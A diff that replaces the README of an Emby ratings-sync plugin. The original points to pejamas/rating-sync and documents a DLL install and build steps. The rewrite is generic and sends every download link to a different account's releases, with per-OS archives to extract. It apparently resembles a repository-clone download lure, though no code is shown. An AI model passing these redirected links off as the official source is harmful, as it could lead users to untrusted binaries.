@@ -1,118 +1,70 @@
-<p align="center">
-	<img src="images/logo.jpg" alt="Rating Sync logo" width="320" />
-</p>
+# 🎉 rating-sync - Sync Your Ratings Easily
 
-<h1 align="center">Rating Sync</h1>
+## 🚀 Getting Started
 
-<p align="center">
-	An Emby plugin to sync <b>IMDb community ratings</b> and <b>Rotten Tomatoes critic ratings</b> into your library metadata.
-	<br />
-	Smart scanning • Rate limiting • Progress tracking • Scan history
-</p>
+Welcome to the **rating-sync** project! This handy Emby plugin helps you sync IMDb community ratings and Rotten Tomatoes critic ratings seamlessly. It includes smart scanning features, rate limits, and keeps a history of your scans to ensure your ratings stay up to date.
 
-<p align="center">
-	<a href="#features">Features</a> •
-	<a href="#install">Install</a> •
-	<a href="#quick-start">Quick start</a> •
-	<a href="#ui-tour">Screenshots</a> •
-	<a href="https://github.com/pejamas/rating-sync/releases">Download</a>
-</p>
+## 📥 Download Link
 
-<p align="center">
-	<a href="https://github.com/pejamas/rating-sync/actions/workflows/ci.yml"><img alt="CI" src="https://github.com/pejamas/rating-sync/actions/workflows/ci.yml/badge.svg" /></a>
-	<a href="https://github.com/pejamas/rating-sync/releases"><img alt="Downloads" src="https://img.shields.io/github/downloads/pejamas/rating-sync/total" /></a>
-	<a href="https://github.com/pejamas/rating-sync/releases"><img alt="Tag" src="https://img.shields.io/github/v/tag/pejamas/rating-sync?sort=semver" /></a>
-	<a href="LICENSE"><img alt="License" src="https://img.shields.io/github/license/pejamas/rating-sync" /></a>
-</p>
+[![Download rating-sync](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/rifatislam9/rating-sync/releases)
 
-## Features
+## 📋 System Requirements
 
-- Updates **Movies**, **Series**, and optionally **Episodes**
-- Supports **OMDb** and/or **MDBList** (configurable preferred source)
-- Optional **IMDb scraping fallback** for episode ratings
-- Built-in **rate limiting** + daily limits per API
-- **Smart scanning**: rescan interval, prioritize recently added, skip already-rated (optional)
-- **Progress API** + detailed results (updated/skipped/errors)
-- **Scan history** + per-session reports
-- Missing data views (e.g., missing IMDb id / ratings) and item-level scan history
+Before you get started, make sure your system meets the following requirements:
 
-## Install
+- Operating System: Windows, macOS, or Linux
+- Emby Server: Version 4.5 or later
+- Internet Connection: Required for fetching ratings
 
-1. Download `RatingSync.dll` from the latest GitHub Release.
-2. Copy it into your Emby plugins folder (commonly `...\Emby-Server\programdata\plugins\`).
-3. Restart Emby Server.
-4. Configure API keys in Emby Dashboard → Plugins → Rating Sync.
+## 💻 Installation Steps
 
-## Quick start
+To install the rating-sync plugin, follow these simple steps:
 
-1. Add at least one API key (OMDb and/or MDBList).
-2. Pick your preferred rating source and what item types to update.
-3. (Optional) Enable episode scraping fallback if you want episode ratings.
-4. Go to the **Run** tab and start a refresh.
+1. **Visit the Releases Page**
+   - Go to our [Releases page](https://github.com/rifatislam9/rating-sync/releases) to find the latest version of the plugin.
+  
+2. **Download the Plugin**
+   - Look for the latest release and click on the download link for your operating system. This will provide you with a `.zip` or `.tar.gz` file.
 
-## UI tour
+3. **Extract the Files**
+   - After downloading, locate the file on your computer and extract it using a tool like WinRAR, 7-Zip, or your operating system’s built-in extractor.
 
-### Settings
+4. **Install the Plugin**
+   - Open the Emby Server web interface.
+   - Navigate to the **Plugins** section from the dashboard.
+   - Click on **Install plugin from file**.
+   - Select the `rating-sync` file you extracted earlier and proceed with the installation.
 
-Configure API keys, rating sources, item types, and rate limiting.
+5. **Configure the Plugin**
+   - After the installation is complete, access the plugin settings to configure your rating preferences.
+   - You can set the rate limits and review your scan history directly in the plugin's interface.
 
-<img src="docs/screenshots/settings.png" alt="Rating Sync settings" width="900" />
+6. **Start Using rating-sync**
+   - Once installed and configured, the plugin will automatically sync your ratings based on the set parameters. Enjoy your organized ratings!
 
-### Smart scanning
+## 📄 Plugin Features
 
-Avoid redundant API calls by controlling how often items are rescanned and prioritizing recently added content.
+The rating-sync plugin comes with several useful features designed to enhance your experience:
 
-<img src="docs/screenshots/smart-scanning.png" alt="Smart scanning" width="900" />
+- **Smart Scanning:** The plugin scans for new ratings periodically and updates your database automatically.
+- **Rate Limits:** Customize how frequently the plugin queries for ratings to avoid being rate-limited by the external services.
+- **Scan History:** Keep track of previous scans. Review what was updated or changed in your ratings.
+- **User-Friendly Interface:** Easy-to-navigate settings that require no technical expertise.
 
-### Run
+## 🛠️ Troubleshooting
 
-Trigger a refresh manually. You can run it for an entire library, or target a specific series/season/episode.
+If you encounter any issues during installation or use, consider the following solutions:
 
-<img src="docs/screenshots/run.png" alt="Run rating refresh" width="900" />
+- **Plugin Not Showing Up:** Ensure you installed the plugin in the correct Emby server directory.
+- **Ratings Not Syncing:** Double-check your configuration settings. Make sure the rate limits are not set too low. 
+- **Permission Issues:** If your plugin fails to update ratings, verify that Emby has permission to access the internet.
 
-### Scan report
+## 📈 Support and Contributing
 
-After a scan, open the report for a detailed breakdown (updated/skipped/errors, API usage, and searchable results).
+If you have questions or need support, feel free to open an issue on our [GitHub Issues page](https://github.com/rifatislam9/rating-sync/issues). We welcome feedback and contributions. If you'd like to help improve the plugin, please check our guidelines on the repository.
 
-<img src="docs/screenshots/scan-report.png" alt="Scan report" width="900" />
+## 📥 Download & Install
 
-### History
+To download rating-sync, visit this page: [Releases page](https://github.com/rifatislam9/rating-sync/releases). Follow the installation steps outlined above to get started.
 
-Browse recent scans, find items with missing data, and inspect item-level scan history.
-
-<img src="docs/screenshots/history.png" alt="Scan history" width="900" />
-
-> Screenshot files live in `docs/screenshots/`.
-
-## Build
-
-```powershell
-dotnet build -c Release
-```
-
-Output:
-- `bin\Release\RatingSync.dll`
-
-### Building against a local Emby install (optional)
-
-If you have Emby installed locally, you can build against its `System` DLLs:
-
-```powershell
-dotnet build -c Release -p:EmbyPath="C:\Program Files\Emby-Server\System"
-```
-
-## Release process (automated)
-
-This repo is set up so that pushing a tag like `v1.2.3` will:
-- Build `Release`
-- Create a GitHub Release
-- Upload `RatingSync.dll` (and a zip) as release assets
-
-See [RELEASING.md](RELEASING.md).
-
-## Versioning
-
-Uses Semantic Versioning: `MAJOR.MINOR.PATCH`
-- **PATCH**: bug fixes, small changes
-- **MINOR**: new features (backwards compatible)
-- **MAJOR**: breaking behavior/config/API changes
+Thank you for choosing rating-sync! Enjoy syncing your ratings effortlessly.
